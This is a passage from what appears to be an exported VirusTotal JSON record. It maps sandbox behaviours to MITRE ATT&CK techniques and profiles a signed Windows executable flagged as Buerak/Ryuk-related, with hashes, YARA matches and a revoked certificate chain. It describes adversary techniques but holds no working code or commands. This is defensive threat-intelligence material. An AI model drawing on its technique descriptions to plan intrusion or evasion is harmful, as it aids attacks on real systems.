            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\nNative API functions (such as NtCreateProcess) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API CreateProcess() or GNU fork() will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1106/",
                "id": "T1106",
                "name": "Native API"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1518/",
                "id": "T1518",
                "name": "Software Discovery"
              },
              {
                "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment. For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the DescribeSecurityGroups action with various request parameters. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1518/001/",
                "id": "T1518.001",
                "name": "Security Software Discovery"
              },
              {
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may attempt to get information about running processes on a system."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1057/",
                "id": "T1057",
                "name": "Process Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/",
                "id": "T1071",
                "name": "Application Layer Protocol"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      },
      "Zenbox": {
        "tactics": [
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads software policies"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1071/",
                "id": "T1071",
                "name": "Application Layer Protocol"
              },
              {
                "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Performs DNS lookups"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1095/",
                "id": "T1095",
                "name": "Non-Application Layer Protocol"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "id": "TA0011",
            "name": "Command and Control"
          }
        ]
      },
      "CAPA": {
        "tactics": [
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "access PEB ldr_data"
                  },
                  {
                    "severity": "INFO",
                    "description": "get ntdll base address"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1129/",
                "id": "T1129",
                "name": "Shared Modules"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "encode data using XOR"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1027/",
                "id": "T1027",
                "name": "Obfuscated Files or Information"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/5c91e90a547e598c68f6ab7a607149e53872feac28386ffc3bea8d00fd1abed6/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65ab8a252c94285bd0692996"
  },
  "data": {
    "attributes": {
      "type_description": "Win32 EXE",
      "tlsh": "T1FE84BF84FF8374F7FC23097155C6F3AA8332E8588632CE8BDA48DA57D5A7643A5148C9",
      "vhash": "0451476d155c051d5d1d17z8002c051z9gz18ez1",
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "crowdsourced_yara_results": [
        {
          "rule_name": "win_ryuk_auto",
          "description": "Detects win.ryuk.",
          "author": "Felix Bilstein - yara-signator at cocacoding dot com",
          "ruleset_id": "008fcd3b82",
          "ruleset_name": "win.ryuk_auto",
          "match_in_subfile": true,
          "source": "https://malpedia.caad.fkie.fraunhofer.de/"
        },
        {
          "rule_name": "win_grimagent_auto",
          "description": "Detects win.grimagent.",
          "author": "Felix Bilstein - yara-signator at cocacoding dot com",
          "ruleset_id": "0087e231c1",
          "ruleset_name": "win.grimagent_auto",
          "match_in_subfile": true,
          "source": "https://malpedia.caad.fkie.fraunhofer.de/"
        }
      ],
      "creation_date": 1601657154,
      "names": [
        "3ee706f07d13cb9e617eac2b4442479634ab48f11005568c739c6dcab75052a4.exe",
        "lNNdFoaQNlan.exe",
        "VRrNoXxPOlan.exe",
        "jTYVoZrbQlan.exe",
        "signed_33.txt",
        "5af409fe584bed2f8b847bb9d2eca34f.virus"
      ],
      "signature_info": {
        "verified": "A certificate was explicitly revoked by its issuer.",
        "signing date": "04:16 PM 10/02/2020",
        "x509": [
          {
            "name": "DigiCert High Assurance EV Root CA",
            "algorithm": "sha1RSA",
            "valid from": "2006-11-10 00:00:00",
            "valid to": "2031-11-10 00:00:00",
            "serial number": "02 AC 5C 26 6A 0B 40 9B 8F 0B 79 F2 AE 46 25 77",
            "cert issuer": "DigiCert High Assurance EV Root CA",
            "thumbprint": "5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25"
          },
          {
            "valid usage": "Code Signing",
            "name": "ARMAUER SP Z O O",
            "algorithm": "sha256RSA",
            "valid from": "2020-10-02 00:00:00",
            "valid to": "2021-10-04 12:00:00",
            "serial number": "0A C9 5B 5E FF 52 C9 0A 70 13 62 E6 45 87 55 E2",
            "cert issuer": "DigiCert EV Code Signing CA (SHA2)",
            "thumbprint": "18F23EE8696664BB95F669951B8E5394F05FA2E6"
          },
          {
            "valid usage": "ff",
            "name": "DigiCert Timestamp Responder",
            "algorithm": "sha1RSA",
            "valid from": "2014-10-22 00:00:00",
            "valid to": "2024-10-22 00:00:00",
            "serial number": "03 01 9A 02 3A FF 58 B1 6B D6 D5 EA E6 17 F0 66",
            "cert issuer": "DigiCert Assured ID CA-1",
            "thumbprint": "614D271D9102E30169822487FDE5DE00A352B01D"
          },
          {
            "valid usage": "Code Signing",
            "name": "DigiCert EV Code Signing CA (SHA2)",
            "algorithm": "sha256RSA",
            "valid from": "2012-04-18 12:00:00",
            "valid to": "2027-04-18 12:00:00",
            "serial number": "03 F1 B4 E1 5F 3A 82 F1 14 96 78 B3 D7 D8 47 5C",
            "cert issuer": "DigiCert High Assurance EV Root CA",
            "thumbprint": "60EE3FC53D4BDFD1697AE5BEAE1CAB1C0F3AD4E3"
          },
          {
            "valid usage": "Server Auth, Client Auth, Code Signing, 0.5.5.7.3.4, Timestamp Signing",
            "name": "DigiCert Assured ID CA-1",
            "algorithm": "sha1RSA",
            "valid from": "2006-11-10 00:00:00",
            "valid to": "2021-11-10 00:00:00",
            "serial number": "06 FD F9 03 96 03 AD EA 00 0A EB 3F 27 BB BA 1B",
            "cert issuer": "DigiCert Assured ID Root CA",
            "thumbprint": "19A09B5A36F4DD99727DF783C17A51231A56C117"
          }
        ],
        "signers": "ARMAUER SP Z O O; DigiCert EV Code Signing CA (SHA2); DigiCert",
        "counter signers details": [
          {
            "status": "This certificate or one of the certificates in the certificate chain is not time valid.",
            "valid usage": "Timestamp Signing",
            "name": "DigiCert Timestamp Responder",
            "algorithm": "sha1RSA",
            "valid from": "12:00 AM 10/22/2014",
            "valid to": "12:00 AM 10/22/2024",
            "serial number": "03 01 9A 02 3A FF 58 B1 6B D6 D5 EA E6 17 F0 66",
            "cert issuer": "DigiCert Assured ID CA-1",
            "thumbprint": "614D271D9102E30169822487FDE5DE00A352B01D"
          },
          {
            "status": "This certificate or one of the certificates in the certificate chain is not time valid.",
            "valid usage": "Server Auth, Client Auth, Code Signing, Email Protection, Timestamp Signing",
            "name": "DigiCert Assured ID CA-1",
            "algorithm": "sha1RSA",
            "valid from": "12:00 AM 11/10/2006",
            "valid to": "12:00 AM 11/10/2021",
            "serial number": "06 FD F9 03 96 03 AD EA 00 0A EB 3F 27 BB BA 1B",
            "cert issuer": "DigiCert Assured ID Root CA",
            "thumbprint": "19A09B5A36F4DD99727DF783C17A51231A56C117"
          },
          {
            "status": "Valid",
            "valid usage": "Client Auth, Code Signing, Email Protection, Server Auth, Timestamp Signing",
            "name": "DigiCert",
            "algorithm": "sha1RSA",
            "valid from": "12:00 AM 11/10/2006",
            "valid to": "12:00 AM 11/10/2031",
            "serial number": "0C E7 E0 E5 17 D8 46 FE 8F E5 60 FC 1B F0 30 39",
            "cert issuer": "DigiCert Assured ID Root CA",
            "thumbprint": "0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43"
          }
        ],
        "counter signers": "DigiCert Timestamp Responder; DigiCert Assured ID CA-1; DigiCert",
        "signers details": [
          {
            "status": "This certificate or one of the certificates in the certificate chain is not time valid., Trust for this certificate or one of the certificates in the certificate chain has been revoked.",
            "valid usage": "Code Signing",
            "name": "ARMAUER SP Z O O",
            "algorithm": "sha256RSA",
            "valid from": "12:00 AM 10/02/2020",
            "valid to": "12:00 PM 10/04/2021",
            "serial number": "0A C9 5B 5E FF 52 C9 0A 70 13 62 E6 45 87 55 E2",
            "cert issuer": "DigiCert EV Code Signing CA (SHA2)",
            "thumbprint": "18F23EE8696664BB95F669951B8E5394F05FA2E6"
          },
          {
            "status": "Valid",
            "valid usage": "Code Signing",
            "name": "DigiCert EV Code Signing CA (SHA2)",
            "algorithm": "sha256RSA",
            "valid from": "12:00 PM 04/18/2012",
            "valid to": "12:00 PM 04/18/2027",
            "serial number": "03 F1 B4 E1 5F 3A 82 F1 14 96 78 B3 D7 D8 47 5C",
            "cert issuer": "DigiCert High Assurance EV Root CA",
            "thumbprint": "60EE3FC53D4BDFD1697AE5BEAE1CAB1C0F3AD4E3"
          },
          {
            "status": "Valid",
            "valid usage": "Client Auth, Code Signing, Email Protection, Server Auth, Timestamp Signing",
            "name": "DigiCert",
            "algorithm": "sha1RSA",
            "valid from": "12:00 AM 11/10/2006",
            "valid to": "12:00 AM 11/10/2031",
            "serial number": "02 AC 5C 26 6A 0B 40 9B 8F 0B 79 F2 AE 46 25 77",
            "cert issuer": "DigiCert High Assurance EV Root CA",
            "thumbprint": "5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25"
          }
        ]
      },
      "last_modification_date": 1705734733,
      "type_tag": "peexe",
      "times_submitted": 5,
      "total_votes": {
        "harmless": 0,
        "malicious": 5
      },
      "size": 407504,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.buerak/exhd",
        "popular_threat_category": [
          {
            "count": 23,
            "value": "trojan"
          },
          {
            "count": 9,
            "value": "downloader"
          },
          {
            "count": 3,
            "value": "ransomware"
          }
        ],
        "popular_threat_name": [
          {
            "count": 9,
            "value": "buerak"
          },
          {
            "count": 5,
            "value": "exhd"
          },
          {
            "count": 3,
            "value": "ryuk"
          }
        ]
      },
      "authentihash": "bbaa9e9f9c44bdd36e3b5c41a0c0903952c12572701e7363ef89e767aab5bddb",
      "detectiteasy": {
        "filetype": "PE32",
        "values": [
          {
            "type": "Compiler",
            "name": "MinGW"
          },
          {
            "info": "GUI32,signed",
            "version": "2.21",
            "type": "Linker",
            "name": "GNU linker ld (GNU Binutils)"
          },
          {
            "info": "PKCS #7",
            "version": "2.0",
            "type": "Sign tool",
            "name": "Windows Authenticode"
          }
        ]
      },
      "last_submission_date": 1690379477,
      "meaningful_name": "3ee706f07d13cb9e617eac2b4442479634ab48f11005568c739c6dcab75052a4.exe",
      "trid": [
        {
          "file_type": "Microsoft Visual C++ compiled executable (generic)",
          "probability": 32.2
        },
        {
          "file_type": "Win64 Executable (generic)",
          "probability": 20.5
        },
        {
          "file_type": "Win32 Dynamic Link Library (generic)",
          "probability": 12.8
        },
        {
          "file_type": "Win16 NE executable (generic)",
          "probability": 9.8
        },
        {
          "file_type": "Win32 Executable (generic)",
          "probability": 8.7
        }
      ],
      "sandbox_verdicts": {
        "Zenbox": {
          "category": "malicious",
          "sandbox_name": "Zenbox",
          "malware_classification": [
            "MALWARE",
            "RANSOM",
            "EVADER"
          ]
        },
        "C2AE": {
          "category": "undetected",
          "sandbox_name": "C2AE",
          "malware_classification": [
            "UNKNOWN_VERDICT"
          ]
        },
        "Yomi Hunter": {
          "category": "malicious",
          "sandbox_name": "Yomi Hunter",
          "malware_classification": [
            "MALWARE"
          ]
        }
      },
      "sha256": "3ee706f07d13cb9e617eac2b4442479634ab48f11005568c739c6dcab75052a4",
      "type_extension": "exe",
      "tags": [
        "peexe",
        "overlay",
        "revoked-cert",
        "runtime-modules",
        "signed",
        "spreader"
      ],
      "last_analysis_date": 1705715586,
      "unique_sources": 5,
      "first_submission_date": 1601864403,
      "sha1": "b49a2eed4d369cd608ffdf8d8cfe491d055f1cd3",
      "ssdeep": "6144:g4LwKpY6JE5pdSv2RNUJsTGiQNZD0I7oIrrhynRiw1amXQ0YKG0RIb890BEaGTd:gEbEy2RKiQNJ0CrARRg0Y4RK89v1p",
      "md5": "5af409fe584bed2f8b847bb9d2eca34f",
      "pe_info": {
        "exports": [
          "CSBhvSWCvFRvfCfAoJdoFuAUmK"
        ],
        "resource_details": [
          {
            "lang": "NEUTRAL DEFAULT",
            "entropy": 5.061229705810547,
            "chi2": 2398941.5,
            "filetype": "unknown",
            "sha256": "d3ea4ef2c0527d2add56dd9db53e57fcf8c73da4561b1fbfd17e3f5c48634524",
            "type": "RT_ICON"
          },
          {
            "lang": "NEUTRAL DEFAULT",
            "entropy": 1.9804819822311401,
            "chi2": 1669.6,
            "filetype": "ICO",
            "sha256": "cd0991dd595a1392452a8c7ccf089e73626bc6eed1fd3f54ee4c6aa7ffbaedba",
            "type": "RT_GROUP_ICON"
          },
          {
            "lang": "ENGLISH US",
            "entropy": 7.992194175720215,
            "chi2": 1577.91,
            "filetype": "unknown",
            "sha256": "322709e2c823cc85cea3368bb9aca709c667218cdd25b2704e7b65a160840984",
            "type": "Struct(888)"
          }
        ],
        "resource_types": {
          "RT_ICON": 1,
          "Struct(888)": 1,
          "RT_GROUP_ICON": 1
        },
        "imphash": "d826b15c5030046a95578a7afce08abb",
        "overlay": {
          "entropy": 7.148726463317871,
          "offset": 398848,
          "chi2": 21828.25,
          "filetype": "unknown",
          "size": 8656,
          "md5": "b84c66ae884f784f4a62269461cf00f6"
        },
        "resource_langs": {
          "NEUTRAL DEFAULT": 2,
          "ENGLISH US": 1
        },
        "machine_type": 332,
        "timestamp": 1601657154,
        "entry_point": 4740,
        "sections": [
          {
            "name": ".text",
            "chi2": 957307.62,
            "virtual_address": 4096,
            "entropy": 6.15,
            "raw_size": 108032,
            "flags": "rx",
            "virtual_size": 107672,
            "md5": "73cf4f00aea87add92b9c9ba7cfb0fa5"
          },
          {
            "name": ".data",
            "chi2": 77651,
            "virtual_address": 114688,
            "entropy": 2.12,
            "raw_size": 512,
            "flags": "rw",
            "virtual_size": 236,
            "md5": "5dc4ceff821da5d5cf4f2df03e6f32ad"
          },
          {
            "name": ".rdata",
            "chi2": 351364.28,
            "virtual_address": 118784,
            "entropy": 5.44,
            "raw_size": 12800,
            "flags": "r",
            "virtual_size": 12608,
            "md5": "a919d589977e9eade51d27bb048059ad"
          },
          {
            "name": ".bss",
            "chi2": -1,
            "virtual_address": 135168,
            "entropy": 0,
            "raw_size": 0,
            "flags": "rw",
            "virtual_size": 20040,
            "md5": "d41d8cd98f00b204e9800998ecf8427e"
          },
          {
            "name": ".edata",
            "chi2": 103520,
            "virtual_address": 155648,
            "entropy": 1.03,
            "raw_size": 512,
            "flags": "r",
            "virtual_size": 84,
            "md5": "5feaed50c0ca5b7709bd55e3def049eb"
          },
          {
            "name": ".idata",
            "chi2": 68670.48,
            "virtual_address": 159744,
            "entropy": 5.12,
            "raw_size": 3584,
            "flags": "rw",
            "virtual_size": 3532,
            "md5": "44139b14300eacbd5168c8295f631f4e"
          },
          {
            "name": ".CRT",
            "chi2": 127511,
            "virtual_address": 163840,
            "entropy": 0.11,
            "raw_size": 512,
            "flags": "rw",
            "virtual_size": 24,
            "md5": "8e741c0729e5a67827c430a8fccac125"
          },
          {
            "name": ".tls",
            "chi2": 124501,
            "virtual_address": 167936,
            "entropy": 0.22,
            "raw_size": 512,
            "flags": "rw",
            "virtual_size": 32,
            "md5": "a46c5f6052631f5ac482d315f54e713b"
          },
          {
            "name": ".rsrc",
            "chi2": 779083.69,
            "virtual_address": 172032,
            "entropy": 7.43,
            "raw_size": 212480,
            "flags": "rw",
            "virtual_size": 212056,
            "md5": "1ed82676ef04e5c39bbdabf6cb1b11f7"
          },
          {
            "name": ".reloc",
            "chi2": 22348.31,
            "virtual_address": 385024,
            "entropy": 6.45,
            "raw_size": 4608,
            "flags": "r",
            "virtual_size": 4496,
            "md5": "723da5c6e757ddc46d3e05cfb6ef4121"
          },
          {
            "name": "/4",
            "chi2": 77111,
            "virtual_address": 393216,
            "entropy": 1.95,
            "raw_size": 512,
            "flags": "r",
            "virtual_size": 416,
            "md5": "c02e2c3b5ef119f89a9129e1b75a68fe"
          },
          {
            "name": "/19",
            "chi2": 30651,
            "virtual_address": 397312,
            "entropy": 4.65,
            "raw_size": 1024,
            "flags": "r",
            "virtual_size": 1004,
            "md5": "40d5c07e154e22010f095846ad3ddc31"
          },
          {
            "name": "/35",
            "chi2": 58071.81,
            "virtual_address": 401408,
            "entropy": 4.52,
            "raw_size": 1536,
            "flags": "r",
            "virtual_size": 1294,
            "md5": "b9d28c32916af58886771c7057a3f4a9"
          },
          {
            "name": "/51",
            "chi2": 286880.94,
            "virtual_address": 405504,
            "entropy": 5.98,
            "raw_size": 26624,
            "flags": "r",
            "virtual_size": 26537,
            "md5": "909bfa511bd715f5a12d2decf8593950"
          },
          {
            "name": "/63",
            "chi2": 93589.74,
